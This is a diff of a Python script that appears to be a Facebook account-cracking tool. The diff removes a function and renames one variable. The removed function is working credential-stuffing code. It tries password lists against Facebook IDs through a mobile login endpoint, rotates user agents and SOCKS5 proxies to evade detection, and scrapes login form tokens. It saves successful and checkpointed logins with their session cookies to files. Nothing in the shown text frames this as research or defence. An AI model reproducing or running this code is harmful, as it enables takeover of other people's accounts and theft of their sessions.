@@ -1080,83 +1080,11 @@ def passwrd():
 		time.sleep(1)
 		exit()
 
-
-
-
-
-def bapi(idf,pwv):
-	global loop,ok,cp
-	bo = random.choice([m,k,h,b,u,x])
-	ua = random.choice(free)
-	ua2 = random.choice(ugen2)
-	ses = requests.Session()
-	prog.update(des,description=f"[bold green]M-Alpha[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
-	prog.advance(des) 
-	for pw in pwv:
-		try:
-			if 'ya' in ualuh: ua = ualu[0]
-			nip=random.choice(prox)
-			proxs= {'http': 'socks5://'+nip}
-			ses.headers.update({"Host": "m.alpha.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-			p = ses.get("https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.alpha.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D274266067164%26cbt%3D1675237736936%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df33eeedf0d23c74%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%26client_id%3D274266067164%26display%3Dtouch%26domain%3Did.pinterest.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.pinterest.com%252Flogin%26locale%3Did_ID%26logger_id%3Df27fa04cd920e98%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96f44d15f7ea8%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%2526frame%253Df7efd9d84b96a8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%252Cuser_friends%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
-			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
-			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={
-			"Host": "m.alpha.facebook.com",
-			"content-length": f"{len(str(dataa))}",
-			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
-			"origin": "https://m.alpha.facebook.com",
-			"content-type": "application/x-www-form-urlencoded",
-			"user-agent": ua,
-			"accept": "*/*",
-			"x-requested-with": "com.microsoft.bing",
-			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
-			"sec-ch-ua-platform": '"Android"',
-			"sec-ch-ua-mobile": "?1",
-			"sec-fetch-site": "same-origin",
-			"sec-fetch-mode": "cors",
-			"sec-fetch-dest": "empty",
-			"sec-fetch-user": "?1",
-			"referer": "https://m.alpha.facebook.com/v2.7/dialog/oauth?app_id=274266067164&cbt=1675237736936&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df33eeedf0d23c74%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener&client_id=274266067164&display=touch&domain=id.pinterest.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.pinterest.com%2Flogin&locale=id_ID&logger_id=f27fa04cd920e98&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail%2Cuser_birthday%2Cuser_friends&sdk=joey&version=v2.7&ret=login&fbapp_pres=0&tp=unspecified",
-			"accept-encoding": "gzip, deflate br",
-			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-			}
-			po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
-			if "checkpoint" in po.cookies.get_dict().keys():
-				cp+=1
-				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
-				tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
-				tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
-				prints(tree)
-				os.popen('play-audio c.mp3')
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				ceker(idf,pw)
-				akun.append(idf+'|'+pw)
-				break
-			elif "c_user" in ses.cookies.get_dict().keys():
-				ok+=1
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
-				tree.add(Panel(f"{H2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
-				tree.add(Panel(f"{H2}{ua}{P2}",style=f"{color_panel}"))
-				tree.add(Panel(f"{H2}{kuki}{P2}",style=f"{color_panel}"))
-				prints(tree)
-				os.popen('play-audio o.mp3')
-				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				cek_apk(kuki)
-				break
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
-
 #--------------------[ METODE reguler ]-----------------#
 def reguler(idf,pwv,awal):
 	global loop,ok,cp
 	rr = random.randint
-	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
+	Rudal = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
 	ahir = str(datetime.now()-awal).split('.')[0]
 	prog.update(des,description=f"{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
